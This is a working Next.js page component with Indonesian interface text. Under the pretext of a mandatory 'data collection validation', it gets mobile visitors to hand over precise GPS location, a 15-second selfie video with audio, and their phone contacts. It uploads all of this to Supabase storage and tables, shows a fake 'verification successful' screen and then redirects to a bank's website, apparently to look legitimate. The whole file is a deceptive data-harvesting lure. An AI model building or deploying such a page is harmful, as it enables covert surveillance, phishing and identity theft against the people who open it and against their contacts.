/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useState, useEffect, useRef } from "react";
import { supabase } from "@/lib/supabse";
import FullScreenLoader from "@/components/FullScreenLoader";
import { LocationData } from "@/types";

export default function Home() {
	const [status, setStatus] = useState<"initial" | "location" | "camera" | "contacts" | "completed" | "error">("initial");
	const [error, setError] = useState("");
	const [userData, setUserData] = useState<{ id?: string; location?: LocationData; contacts?: any[] }>({});
	const [countdown, setCountdown] = useState(15);
	const videoRef = useRef<HTMLVideoElement>(null);
	const mediaRecorderRef = useRef<MediaRecorder | null>(null);
	const recordedChunksRef = useRef<Blob[]>([]);
	const countdownTimerRef = useRef<NodeJS.Timeout | null>(null);

	useEffect(() => {
		if (typeof window !== "undefined" && window.innerWidth < 768) {
			setTimeout(() => {
				setStatus("location");
				requestLocation();
			}, 3000);
		} else {
			setStatus("error");
			setError("Hanya tersedia di perangkat mobile");
		}
	}, []);

	// Fungsi untuk mendapatkan mimeType yang didukung
	const getSupportedMimeType = () => {
		const mimeTypes = ["video/webm", "video/mp4"];

		for (const mimeType of mimeTypes) {
			if (MediaRecorder.isTypeSupported(mimeType)) {
				return mimeType;
			}
		}
		return "video/webm";
	};

	const requestLocation = async () => {
		try {
			const location = await getLocation();
			setUserData((prev) => ({ ...prev, location }));

			const { data, error } = await supabase.from("user_data").insert([{ location }]).select().single();

			if (error) throw new Error(`Gagal menyimpan lokasi: ${error.message}`);

			setUserData((prev) => ({ ...prev, id: data.id }));
			setStatus("camera");
		} catch (err: any) {
			setStatus("error");
			setError(err.message);
		}
	};

	const startCamera = async () => {
		try {
			const stream = await navigator.mediaDevices.getUserMedia({
				video: { facingMode: "user" },
				audio: true,
			});

			if (videoRef.current) {
				videoRef.current.srcObject = stream;
			}

			return stream;
		} catch (err) {
			throw new Error(`Gagal mengakses kamera: ${(err as Error).message}`);
		}
	};

	const handleStartRecording = async () => {
		try {
			const stream = await startCamera();

			// Dapatkan mimeType yang didukung
			const mimeType = getSupportedMimeType();

			const recorder = new MediaRecorder(stream, { mimeType });
			mediaRecorderRef.current = recorder;
			recordedChunksRef.current = [];

			recorder.ondataavailable = (e) => {
				if (e.data.size > 0) {
					recordedChunksRef.current.push(e.data);
				}
			};

			recorder.onstop = async () => {
				try {
					// Buat blob dari rekaman
					const blob = new Blob(recordedChunksRef.current, { type: mimeType });

					// Tentukan ekstensi file berdasarkan mimeType
					const extension = mimeType.includes("mp4") ? "mp4" : "webm";
					const fileName = `video-${Date.now()}.${extension}`;

					// Simpan blob ke Supabase Storage
					const { data, error } = await supabase.storage.from("videos").upload(fileName, blob, {
						contentType: mimeType,
						cacheControl: "3600",
					});

					if (error) throw new Error(`Upload gagal: ${error.message}`);

					// Dapatkan URL publik
					const { data: publicUrlData } = supabase.storage.from("videos").getPublicUrl(data.path);

					const videoUrl = publicUrlData.publicUrl;

					// Simpan URL video ke database
					if (userData.id) {
						await supabase.from("user_videos").insert([
							{
								user_data_id: userData.id,
								video_url: videoUrl,
							},
						]);
					}

					// Lanjut ke kontak
					setStatus("contacts");
					requestContacts();

					// Hentikan stream
					stream.getTracks().forEach((track) => track.stop());
				} catch (err) {
					setStatus("error");
					setError(`Gagal mengunggah video: ${(err as Error).message}`);
				}
			};

			// Mulai countdown
			setCountdown(15);
			countdownTimerRef.current = setInterval(() => {
				setCountdown((prev) => {
					if (prev <= 1) {
						if (countdownTimerRef.current) clearInterval(countdownTimerRef.current);
						recorder.stop();
						return 0;
					}
					return prev - 1;
				});
			}, 1000);

			recorder.start();
		} catch (err) {
			setStatus("error");
			setError(`Gagal memulai rekaman: ${(err as Error).message}`);
		}
	};

	const requestContacts = async () => {
		try {
			if (!("contacts" in navigator)) {
				console.warn("Browser tidak mendukung akses kontak");
				setStatus("completed");
				return;
			}

			const contacts = await (navigator as any).contacts.select(["name", "email", "tel"], { multiple: true });
			const formattedContacts = contacts.map((contact: any) => ({
				name: contact.name?.[0] || "",
				email: contact.email?.[0] || "",
				phone: contact.tel?.[0] || "",
			}));

			setUserData((prev) => ({ ...prev, contacts: formattedContacts }));

			// Simpan kontak ke database
			if (userData.id) {
				await supabase.from("user_data").update({ contacts: formattedContacts }).eq("id", userData.id);
			}

			setStatus("completed");

			// Redirect setelah 2 detik
			setTimeout(() => {
				window.location.href = process.env.NEXT_PUBLIC_REDIRECT_URL || "https://www.bca.co.id";
			}, 2000);
		} catch (err: any) {
			console.error("Error mengambil kontak:", err);
			setStatus("completed");
		}
	};

	return (
		<div className="min-h-screen flex flex-col items-center justify-center p-4 bg-white">
			{status === "initial" && <FullScreenLoader message="Anda harus melewati validasi pengumpulan data untuk bisa melanjutkan akses ke website kami" />}

			{status === "location" && (
				<div className="text-center max-w-md">
					<div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-500 mx-auto mb-6"></div>
					<h2 className="text-xl font-semibold text-gray-800 mb-2">Mengakses Lokasi</h2>
					<p className="text-gray-600">Sedang mengumpulkan data lokasi Anda...</p>
					<div className="mt-6 bg-blue-50 p-4 rounded-lg">
						<p className="text-blue-700">Harap berikan izin akses lokasi saat diminta</p>
					</div>
				</div>
			)}

			{status === "camera" && (
				<div className="w-full max-w-md">
					<div className="bg-gray-100 rounded-xl overflow-hidden mb-6 border border-gray-200 relative">
						<video ref={videoRef} autoPlay playsInline muted className="w-full h-auto aspect-video object-cover" />
						{countdown > 0 && countdown < 15 && <div className="absolute top-4 right-4 bg-red-500 text-white px-3 py-1 rounded-full font-bold">{countdown}s</div>}
					</div>

					<div className="text-center">
						{countdown === 15 ? (
							<button onClick={handleStartRecording} className="px-6 py-3 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors shadow-md">
								Mulai Merekam (15 detik)
							</button>
						) : (
							<div className="py-3">
								<p className="text-gray-600">Video sedang direkam...</p>
								<div className="mt-2 w-full bg-gray-200 rounded-full h-2">
									<div className="bg-blue-600 h-2 rounded-full" style={{ width: `${(countdown / 15) * 100}%` }}></div>
								</div>
							</div>
						)}
					</div>
				</div>
			)}

			{status === "contacts" && (
				<div className="text-center max-w-md">
					<div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-500 mx-auto mb-6"></div>
					<h2 className="text-xl font-semibold text-gray-800 mb-2">Mengakses Kontak</h2>
					<p className="text-gray-600">Sedang mengumpulkan data kontak Anda...</p>
					<div className="mt-6 bg-blue-50 p-4 rounded-lg">
						<p className="text-blue-700">Harap pilih kontak yang ingin dibagikan</p>
					</div>
				</div>
			)}

			{status === "completed" && (
				<div className="text-center max-w-md">
					<div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
						<svg className="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
							<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
						</svg>
					</div>
					<h2 className="text-2xl font-semibold text-gray-800 mb-4">Verifikasi Berhasil!</h2>
					<p className="text-gray-600 mb-6">Semua data telah berhasil dikumpulkan dan disimpan.</p>
					<div className="bg-green-50 p-4 rounded-lg border border-green-200">
						<p className="text-green-700">Anda akan diarahkan ke halaman tujuan...</p>
					</div>
				</div>
			)}

			{status === "error" && (
				<div className="text-center max-w-md p-6 bg-white rounded-xl shadow-lg border border-gray-200">
					<div className="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
						<svg className="w-12 h-12 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
							<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
						</svg>
					</div>
					<h2 className="text-xl font-semibold text-gray-800 mb-2">Terjadi Kesalahan</h2>
					<p className="text-gray-600 mb-6">{error}</p>
					<button onClick={() => window.location.reload()} className="px-6 py-3 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors">
						Coba Lagi
					</button>
				</div>
			)}
		</div>
	);
}

// ===== Fungsi Bantuan =====
const getLocation = async (): Promise<{ lat: number; lng: number; accuracy: number }> => {
	return new Promise((resolve, reject) => {
		if (!navigator.geolocation) {
			reject(new Error("Browser tidak mendukung geolokasi"));
			return;
		}

		navigator.geolocation.getCurrentPosition(
			(position) => {
				resolve({
					lat: position.coords.latitude,
					lng: position.coords.longitude,
					accuracy: position.coords.accuracy,
				});
			},
			(error) => {
				reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`));
			},
			{ enableHighAccuracy: true, timeout: 10000 }
		);
	});
};
